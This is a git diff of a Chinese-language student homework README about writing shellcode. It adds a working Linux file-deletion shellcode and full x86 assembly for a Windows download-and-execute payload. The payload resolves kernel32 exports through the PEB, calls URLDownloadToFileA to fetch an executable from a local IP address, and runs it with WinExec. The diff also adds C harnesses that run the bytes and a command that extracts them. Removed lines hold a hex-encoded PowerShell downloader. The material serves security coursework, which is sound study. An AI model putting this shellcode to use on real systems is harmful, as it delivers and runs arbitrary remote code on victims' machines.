@@ -6,11 +6,9 @@
    - [Windows/x64 - Download File (http://192.168.10.129/pl.exe) + Execute (C:/Users/Public/p.exe) Shellcode (358 bytes)](https://www.exploit-db.com/shellcodes/40821)
    - [Windows/x64 (XP) - Download File + Execute Shellcode Using Powershell (Generator)](https://www.exploit-db.com/shellcodes/36411) 
 
-找一个 VERIFIED 的代码，有点难
-
 ## Windows
 
-- [弹出MessagBox的参考示例代码](https://www.exploit-db.com/shellcodes/13828)
+### [弹出MessagBox的参考示例代码](https://www.exploit-db.com/shellcodes/13828)
 
 ```c
 /*
@@ -50,47 +48,14 @@ int main(int argc, char** argv)
 }
 ```
 
-- messagebox得找`USER32.lib`或者`USER32.dll`
-  
-  <img src="./img/pefile.jpg" width=50%>
-
-  <img src="./img/findpefileheader.png">
+- 通过简单调试过程，发现该汇编代码是通过获得LoadLibrary函数的地址后，通过LoadLibrary来加载user32.dll，最后再加载MessageBoxA函数
 
   <img src="./img/MessageBoxA.png">
 
-- \x68\x4F\x5F\x6F\x21：将参数入栈：O_o!:  79 95 111 33 > 4f 5f 6f 21 x4F\x5F\x6F\x21
+- 简单修改：`\x4F\x5F\x6F\x21`该段代码是将参数入栈：x4F\x5F\x6F\x21 > 79 95 111 33 > O_o!
   - 修改参数 zizi : 122 105 122 105 > 7a 69 7a 69 > \x7a\x69\x7a\x69
   
-<img src="./img/MessageBoxA.gif">
-
-### 代码逻辑
-
-
-
-- 注：
-  - https://www.exploit-db.com/shellcodes/48229 - 会出现内存访问错误问题，还未调整
-  - https://www.exploit-db.com/shellcodes/28996 - 会出现broken byte
-
-## Win 7 下运行
-
-```c
-#include <windows.h>
-#include <stdio.h>
-
-char code[] ="\x31\xC0\xB8\x6F\x86\x67\x77\xFF\xD0";
-
-int main(int argc, char **argv)
-{
-	int(*func)();
-	DWORD dwOldProtect;
-	//func = (int(*)()) code;
-	VirtualProtect(code, sizeof(code), PAGE_EXECUTE_READWRITE, &dwOldProtect);
-	func = (int(*)()) code;
-	(int)(*func)();
-}
-```
-
-- 执行会报错
+    <img src="./img/MessageBoxA.gif">
 
 ### 拿win10的代码到win7虚拟机下跑
 
@@ -123,59 +88,64 @@ int main(int argc, char **argv)
 
 ## Linux
 
-- Segmentation fault(Core Dump)
-  - When a piece of code tries to do read and write operation in a read only location in memory or freed block of memory, it is known as core dump.
-  - It is an error indicating memory corruption.
+### [Linux/x86_64 - Delete File (test.txt) Shellcode (28 bytes)](https://www.exploit-db.com/shellcodes/46870)
 
-## Conclusion
+- 编写.c文件，写入
+    ```c
+    #include <stdio.h>
+    #include <string.h>
 
-- x86指的是32位计算机的架构，也指32位的操作系统，比如i386，i686，i486等；x86_64和x64指的都是64位架构，也指64位操作系统
+    char sh[]="\xeb\x0d\x6a\x57\x58\x5f\x0f\x05\x48"
+            "\x31\xc0\xb0\x3c\x0f\x05\xe8\xee\xff"
+            "\xff\xff\x74\x65\x73\x74\x2e\x74\x78\x74";
 
-## 下载执行
 
-```
-\x29\x3b\x7d\x22\x65\x78\x65\x27\x74\x74\x79\x2e\x28\x27\x70\x75\x63\x75\x74\x65\x6c\x45\x78\x65\x53\x65\x6c\x6f\x6e\x29\x2e\x63\x61\x74\x69\x70\x70\x6c\x69\x6c\x6c\x2e\x41\x20\x53\x65\x2d\x63\x6f\x6d\x65\x63\x74\x20\x2d\x4f\x62\x6a\x28\x4e\x65\x77\x27\x29\x20\x3b\x2e\x65\x78\x65\x75\x74\x74\x79\x2c\x20\x27\x70\x65\x78\x65\x27\x74\x74\x79\x2e\x36\x2f\x70\x75\x74\x2f\x78\x38\x61\x74\x65\x73\x74\x79\x2f\x6c\x2f\x70\x75\x74\x74\x61\x6d\x73\x67\x74\x61\x6c\x69\x2f\x7e\x72\x74\x2e\x65\x2e\x65\x61\x2f\x2f\x74\x74\x70\x73\x3a\x28\x27\x74\x46\x69\x6c\x65\x6c\x6f\x61\x64\x44\x6f\x77\x6e\x6e\x74\x29\x2e\x43\x6c\x69\x65\x2e\x57\x65\x62\x20\x4e\x65\x74\x6a\x65\x63\x74\x77\x2d\x4f\x62\x20\x28\x4e\x65\x22\x26\x20\x7b\x61\x6e\x64\x20\x63\x6f\x6d\x6d\x6c\x6c\x20\x2d\x72\x73\x65\x70\x6f\x77\x65
-```
-
-转换的结果如下
-```
-);}"exe'tty.('pucutelExeSelon).catipplill.A Se-comect -Obj(New') ;.exeutty, 'pexe'tty.6/put/x8atesty/l/puttamsgtali/~rt.e.ea//ttps:('tFileloadDownnt).Clie.Web Netjectw-Ob (Ne"& {and commll -rsepowe
-```
-
-- 路径：https://github.com/purplezi/Software-and-System-Security/blob/master/hw-0x04-Shellcode/exe/test.exe
+    void main(int argc, char **argv)
+    {
+            printf("Shellcode Length: %d\n", strlen (sh));
+            int (*func)();
+            func = (int (*)()) sh;
+            (int)(*func)();
+    }
+    ```
+- 在命令行下输入`gcc -fno-stack-protector -z execstack delete.c`。在同目录下新建test.txt，运行刚生成的可执行文件发现test.txt已被删除
   
-  ```
-  \x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x70\x75\x72\x70\x6c\x65\x7a\x69\x2f\x53\x6f\x66\x74\x77\x61\x72\x65\x2d\x61\x6e\x64\x2d\x53\x79\x73\x74\x65\x6d\x2d\x53\x65\x63\x75\x72\x69\x74\x79\x2f\x62\x6c\x6f\x62\x2f\x6d\x61\x73\x74\x65\x72\x2f\x68\x77\x2d\x30\x78\x30\x34\x2d\x53\x68\x65\x6c\x6c\x63\x6f\x64\x65\x2f\x65\x78\x65\x2f\x74\x65\x73\x74\x2e\x65\x78\x65
-\x\x```
+  <img src="./img/linux-del.png">
 
-- 保存路径：E:\a.exe
-  - c:\a.a > 63 3a 5c 61 2e 61
-  - E:\a.exe > 45 3a 5c 61 2e 65 78 65 \x68\x65\x78\x65\x2e\x68\x61\x5c\x3a\x45
-  - 如果不够则\x00
+- 汇编代码
+    ```asm
+    global _start
+    section .text
 
-```
-char shellcode[] = \
+    _start:
+        jmp short _file
 
-"\xe9\x88\x00\x00\x00\x5f\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68"
-"\x08\x8b\xf7\x6a\x02\x59\xe8\x31\x00\x00\x00\xe2\xf9\x68\x6f\x6e\x00\x00\x68\x75\x72"
-"\x6c\x6d\x54\xff\x16\x8b\xe8\xe8\x1b\x00\x00\x00\x68\x65\x78\x65\x2e\x68\x61\x5c\x3a"
-"\x45\x54\x5b\x33\xc0\x50\x50\x53\x57\x50\xff\x56\x08\x50\x53\xff\x56\x04\x51\x56\x8b"
-"\x75\x3c\x8b\x74\x2e\x78\x03\xf5\x56\x8b\x76\x20\x03\xf5\x33\xc9\x49\x41\xad\x03\xc5"
-"\x33\xdb\x0f\xbe\x10\x3a\xd6\x74\x08\xc1\xcb\x0d\x03\xda\x40\xeb\xf1\x3b\x1f\x75\xe7"
-"\x5e\x8b\x5e\x1c\x03\xdd\x8b\x04\x8b\x03\xc5\xab\x5e\x59\xc3\xe8\x73\xff\xff\xff\x8e"
-"\x4e\x0e\xec\x98\xfe\x8a\x0e\x36\x1a\x2f\x70\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69"
-"\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x70\x75\x72\x70\x6c\x65\x7a\x69\x2f\x53\x6f\x66"
-"\x74\x77\x61\x72\x65\x2d\x61\x6e\x64\x2d\x53\x79\x73\x74\x65\x6d\x2d\x53\x65\x63\x75"
-"\x72\x69\x74\x79\x2f\x62\x6c\x6f\x62\x2f\x6d\x61\x73\x74\x65\x72\x2f\x68\x77\x2d\x30"
-"\x78\x30\x34\x2d\x53\x68\x65\x6c\x6c\x63\x6f\x64\x65\x2f\x65\x78\x65\x2f\x74\x65\x73\x74\x2e\x65\x78\x65\x00";
-```
+    delete:
+        push 87             ;sys_unlink
+        pop rax
+        pop rdi             ;fname
+        syscall
 
-## 下载执行 - shellcode
+    exit:
+        xor rax,  rax
+        mov al,   60         ;sys_exit
+        syscall
+
+    _file:
+        call delete
+        fname: db "test.txt"
+    ```
+
+> Segmentation fault(Core Dump)
+> - When a piece of code tries to do read and write operation in a read only location in memory or freed block of memory, it is known as core dump.
+> - It is an error indicating memory corruption.
+
+## Win10 / 64位 - 下载执行shellcode
 
 ### C语言编写的代码
 
 - 此处使用的URLDownloadToFile函数名为`URLDownloadToFileA`(区别于`URLDownloadToFileW`)
-- ~~WinExec执行~~
+- WinExec执行
     ```
     若函数调用成功，则返回值大于31。若函数调用失败，则返回值为下列之一： 
     0：系统内存或资源已耗尽。
@@ -205,8 +175,10 @@ char shellcode[] = \
             printf("URLDownloadToFile Fail,Error:%d\n", GetLastError());
         }
     }
-
     ```
+
+    因为该应用程序需要**管理员权限**，所以直接使用WinExec运行无法成功
+
 - 换成system函数重新执行成功
     ```c
     #include <stdio.h>
@@ -232,31 +204,289 @@ char shellcode[] = \
 
 #### 编写汇编代码
 
-##### URLDownloadFileA函数
+[asm代码见](./code/win32-download-execute.asm)
 
-URLDownloadToFileA函数在 Urlmon.dll 这个dll中，这个dll不是默认加载的，所以可能还需要调用LoadLibrary函数
+##### 创建栈帧
 
-##### System函数
-
-System函数的内存地址（由于ASLR的原因，函数的内存地址在每台机器上可能会不一样）。下面是获取DLL内存地址的代码，以获取DLL中导出函数System
-
-```
-#include "windows.h"
-#include "stdio.h"
-
-int main()
-{
-    HINSTANCE LibHandle = LoadLibrary("msvcrt.dll"); //要获取DLL的内存地址
-    printf("msvcrt Address = 0x%x \n",LibHandle);
-    LPTSTR getaddr = (LPTSTR)GetProcAddress(LibHandle, "system"); //获取DLL中导出函数地址
-    printf(“system Address = 0x%x \n", getaddr);
-
-    getchar();
-    return 0;
-}
+```asm
+_start:
+; Create a new stack frame
+ mov ebp, esp            ; Set base stack pointer for new stack-frame
+ sub esp, 0x20           ; Decrement the stack by 2 x 16 = 32 bytes
 ```
 
-# References
+##### 寻找kernel32.dll的基址 
+
+> 注：URLDownloadToFileA函数在 Urlmon.dll 这个dll中，这个dll不是默认加载的，所以还需要调用LoadLibrary函数(位于Kernel32.dll)
+> 查找LoadLibrary的代码参见：https://www.exploit-db.com/exploits/48355
+
+```asm
+; Find kernel32.dll base address
+ xor ebx, ebx            ; EBX = 0x00000000
+ mov ebx, [fs:ebx+0x30]  ; EBX = Address_of_PEB
+ mov ebx, [ebx+0xC]      ; EBX = Address_of_LDR
+ mov ebx, [ebx+0x1C]     ; EBX = 1st entry in InitOrderModuleList / ntdll.dll
+ mov ebx, [ebx]          ; EBX = 2nd entry in InitOrderModuleList / kernelbase.dll
+ mov ebx, [ebx]          ; EBX = 3rd entry in InitOrderModuleList / kernel32.dll
+ mov eax, [ebx+0x8]      ; EAX = &kernel32.dll / Address of kernel32.dll
+ mov [ebp-0x4], eax      ; [EBP-0x04] = &kernel32.dll
+```
+
+##### 寻找kernel32.dll导出表的地址
+
+```asm
+; Find the address of the Export Table within kernel32.dll
+ mov ebx, [eax+0x3C]     ; EBX = Offset NewEXEHeader  = 0xF8
+ add ebx, eax            ; EBX = &NewEXEHeader        = 0xF8 + &kernel32.dll
+ mov ebx, [ebx+0x78]     ; EBX = RVA ExportTable      = 0x777B0 = [&NewExeHeader + 0x78]
+ add ebx, eax            ; EBX = &ExportTable         = RVA ExportTable + &kernel32.dll
+```
+
+##### 寻找kernel32.dll的name pointer table
+
+```asm
+; Find the address of the Name Pointer Table within kernel32.dll
+; + Contains pointers to strings of function names - 4-byte/dword entries
+ mov edi, [ebx+0x20]     ; EDI = RVA NamePointerTable = 0x790E0
+ add edi, eax            ; EDI = &NamePointerTable    = 0x790E0 + &kernel32.dll
+ mov [ebp-0x8], edi      ; save &NamePointerTable to stack frame
+```
+
+##### 寻找kernel32.dll的Ordinal Table 序数表
+
+```asm
+; Find the address of the Ordinal Table
+;   - 2-byte/word entries
+ mov ecx, [ebx+0x24]     ; ECX = RVA OrdinalTable     = 0x7A9E8
+ add ecx, eax            ; ECX = &OrdinalTable        = 0x7A9E8 + &kernel32.dll
+ mov [ebp-0xC], ecx      ; save &OrdinalTable to stack-frame
+```
+
+##### 找到Address Table的地址
+
+```asm
+; Find the address of the Address Table
+ mov edx, [ebx+0x1C]     ; EDX = RVA AddressTable     = 0x777CC
+ add edx, eax            ; EDX = &AddressTable        = 0x777CC + &kernel32.dll
+ mov [ebp-0x10], edx     ; save &AddressTable to stack-frame
+```
+
+##### 找kernel32.dll导出表中functions的数量
+
+```asm
+; Find Number of Functions within the Export Table of kernel32.dll
+ mov edx, [ebx+0x14]     ; EDX = Number of Functions  = 0x642
+ mov [ebp-0x14], edx     ; save value of Number of Functions to stack-frame
+```
+
+##### 寻找LoadLibrary的入口点
+
+> 为什么不能像计算器shellcode一样直接获取loadlibrary的地址？
+> 首先通过寻找GetProcAddress的位置，通过调用这个函数获取LoadLibrary的地址
+
+> jmp short 标号（转到标号处执行命令）
+
+```asm
+jmp short functions
+
+findFunctionAddr:
+; Initialize the Counter to prevent infinite loop
+ xor eax, eax            ; EAX = Counter = 0
+ mov edx, [ebp-0x14]     ; get value of Number of Functions from stack-frame
+; Loop through the NamePointerTable and compare our Strings to the Name Strings of kernel32.dll
+searchLoop:
+ mov edi, [ebp-0x8]      ; EDI = &NamePointerTable
+ mov esi, [ebp+0x18]     ; ESI = Address of String for the Symbol we are searching for
+ xor ecx, ecx            ; ECX = 0x00000000
+ cld                     ; clear direction flag - Process strings from left to right
+ mov edi, [edi+eax*4]    ; EDI = RVA NameString      = [&NamePointerTable + (Counter * 4)]
+ add edi, [ebp-0x4]      ; EDI = &NameString         = RVA NameString + &kernel32.dll
+ add cx, 0xF             ; ECX = len("GetProcAddress,0x00") = 15 = 14 char + 1 Null
+ repe cmpsb              ; compare first 8 bytes of [&NameString] to "GetProcAddress,0x00"
+ jz found                ; If string at [&NameString] == "GetProcAddress,0x00", then end loop
+ inc eax                 ; else Counter ++
+ cmp eax, edx            ; Does EAX == Number of Functions?
+ jb searchLoop           ;   If EAX != Number of Functions, then restart the loop
+
+found:
+; Find the address of GetProcAddress by using the last value of the Counter
+ mov ecx, [ebp-0xC]      ; ECX = &OrdinalTable
+ mov edx, [ebp-0x10]     ; EDX = &AddressTable
+ mov ax,  [ecx + eax*2]  ;  AX = ordinalNumber      = [&OrdinalTable + (Counter*2)]
+ mov eax, [edx + eax*4]  ; EAX = RVA GetProcAddress = [&AddressTable + ordinalNumber]
+ add eax, [ebp-0x4]      ; EAX = &GetProcAddress    = RVA GetProcAddress + &kernel32.dll
+ ret
+
+functions:
+# Push string "GetProcAddress",0x00 onto the stack
+ xor eax, eax            ; clear eax register
+ mov ax, 0x7373          ; AX is the lower 16-bits of the 32bit EAX Register
+ push eax                ;   ss : 73730000 // EAX = 0x00007373 // \x73=ASCII "s"
+ push 0x65726464         ; erdd : 65726464 // "GetProcAddress"
+ push 0x41636f72         ; Acor : 41636f72
+ push 0x50746547         ; PteG : 50746547
+ mov [ebp-0x18], esp      ; save PTR to string at bottom of stack (ebp)
+ call findFunctionAddr   ; After Return EAX will = &GetProcAddress
+# EAX = &GetProcAddress
+ mov [ebp-0x1C], eax      ; save &GetProcAddress
+
+; Call GetProcAddress(&kernel32.dll, PTR "LoadLibraryA"0x00)
+ xor edx, edx            ; EDX = 0x00000000
+ push edx                ; null terminator for LoadLibraryA string
+ push 0x41797261         ; Ayra : 41797261 // "LoadLibraryA",0x00
+ push 0x7262694c         ; rbiL : 7262694c
+ push 0x64616f4c         ; daoL : 64616f4c
+ push esp                ; $hModule    -- push the address of the start of the string onto the stack
+ push dword [ebp-0x4]    ; $lpProcName -- push base address of kernel32.dll to the stack
+ mov eax, [ebp-0x1C]     ; Move the address of GetProcAddress into the EAX register
+ call eax                ; Call the GetProcAddress Function.
+ mov [ebp-0x20], eax     ; save Address of LoadLibraryA
+```
+
+##### 通过LoadLibrary找到Urlmon.dll
+
+```asm
+; Call LoadLibraryA(PTR "urlmon") msvcrt
+;   push "urlmon",0x00 to the stack and save pointer
+ xor eax, eax            ; clear eax
+ mov ax, 0x6E6F          ; no : 6E6F
+ push eax
+ push 0x6D6C7275         ; mlru : 6D6C7275
+ push esp                ; push the pointer to the string
+ mov ebx, [ebp-0x20]     ; LoadLibraryA Address to ebx register
+ call ebx                ; call the LoadLibraryA Function to load urlmon.dll
+ mov [ebp-0x24], eax     ; save Address of urlmon.dll
+```
+
+##### 通过urlmon.dll获得URLDownloadToFileA的入口地址
+
+```asm
+; Call GetProcAddress(urlmon.dll, "URLDownloadToFileA") 
+ xor edx, edx
+ mov dx, 0x4165          ; Ae : 4165
+ push edx
+ push 0x6C69466F         ; liFo : 6c69466f 
+ push 0x5464616F         ; Tdao : 5464616f
+ push 0x6C6E776F         ; lnwo : 6c6e776f
+ push 0x444C5255         ; DLRU : 444c5255
+ push esp                ; push pointer to string to stack for 'URLDownloadToFileA'
+ push dword [ebp-0x24]   ; push base address of urlmon.dll to stack
+ mov eax, [ebp-0x1C]     ; PTR to GetProcAddress to EAX
+ call eax                ; GetProcAddress
+;   EAX = WSAStartup Address
+ mov [ebp-0x28], eax     ; save Address of urlmon.URLDownloadToFileA
+```
+
+##### 使用URLDownloadToFileA下载文件
+
+URLDownloadToFileA汇编代码的依据：https://www.exploit-db.com/shellcodes/40094
+
+> 需要开启本机器的web服务，在根目录下提供exe下载
+
+```asm
+;URLDownloadToFileA(NULL, URL, save as, 0, NULL)
+download:
+pop eax
+xor ecx, ecx
+push ecx
+; URL: http://192.168.0.105/res.exe
+push 0x6578652E         ; exe.
+push 0x7365722F         ; ser/
+push 0x3530312E         ; 501.
+push 0x302E3836         ; 0.86
+push 0x312E3239         ; 1.29
+push 0x312F2F3A         ; 1//:
+push 0x70747468         ; ptth
+push esp
+pop ecx                 ; save the URL string
+xor ebx, ebx
+push ebx
+; save as test.exe
+push 0x6578652E         ; exe.
+push 0x74736574         ; tset
+push esp
+pop ebx                 ; save the downloaded filename string
+xor edx, edx
+push edx
+push edx
+push ebx
+push ecx
+push edx
+mov eax, [ebp-0x28]     ; PTR to URLDownloadToFileA to EAX
+call eax
+pop ecx
+add esp, 44
+xor edx, edx
+cmp eax, edx
+push ecx
+jnz download            ; if it fails to download , retry contineusly
+pop edx
+```
+
+##### 查找system函数，并调用该函数运行
+
+```asm
+; Create string 'WinExec\x00' on the stack and save its address to the stack-frame
+mov edx, 0x63657878     ; "cexx"
+shr edx, 8              ; Shifts edx register to the right 8 bits
+push edx                ; "\x00,cex"
+push 0x456E6957         ; EniW : 456E6957
+mov [ebp+0x18], esp     ; save address of string 'WinExec\x00' to the stack-frame
+call findFunctionAddr   ; After Return EAX will = &WinExec
+
+; Call WinExec( CmdLine, ShowState );
+;   CmdLine   = "tset.exe"
+;   ShowState = 0x00000000 = SW_HIDE - Hides the window and activates another window.
+xor ecx, ecx          ; clear eax register
+push ecx              ; string terminator 0x00 for "test.exe" string
+push 0x6578652e       ; exe. : 6578652e
+push 0x74736574       ; tset : 74736574
+mov ebx, esp          ; save pointer to "test.exe" string in eax
+inc ecx               ; uCmdShow SW_SHOWNORMAL = 0x00000001
+push ecx              ; uCmdShow  - push 0x1 to stack # 2nd argument
+push ebx              ; lpcmdLine - push string address stack # 1st argument
+call eax              ; Call the WinExec Function
+```
+
+##### 调用ExitProcess退出
+
+```asm
+; Create string 'ExitProcess\x00' on the stack and save its address to the stack-frame
+ xor ecx, ecx          ; clear eax register
+ mov ecx, 0x73736501     ; 73736501 = "sse",0x01 // "ExitProcess",0x0000 string
+ shr ecx, 8              ; ecx = "ess",0x00 // shr shifts the register right 8 bits
+ push ecx                ;  sse : 00737365
+ push 0x636F7250         ; corP : 636F7250
+ push 0x74697845         ; tixE : 74697845
+ mov [ebp+0x18], esp     ; save address of string 'ExitProcess\x00' to stack-frame
+ call findFunctionAddr   ; After Return EAX will = &ExitProcess
+
+; Call ExitProcess(ExitCode)
+ xor edx, edx
+ push edx                ; ExitCode = 0
+ call eax                ; ExitProcess(ExitCode)
+```
+
+##### 将汇编指令转化成shellcode
+
+```bash
+nasm -f win32 win32-download-execute.asm -o win32-download-execute.o
+for i in $(objdump -D win32-download-execute.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
+```
+
+编写C语言代码，测试结果
+
+<img src="./img/executwindows-download-execute.gif">
+
+## Improvement
+
+- [ ] 采用system执行时，汇编代码的编写
+
+## Conclusion
+
+- x86指的是32位计算机的架构，也指32位的操作系统，比如i386，i686，i486等；x86_64和x64指的都是64位架构，也指64位操作系统
+
+## References
 
 - https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-peb
 - https://www.cnblogs.com/binlmmhc/p/6501545.html
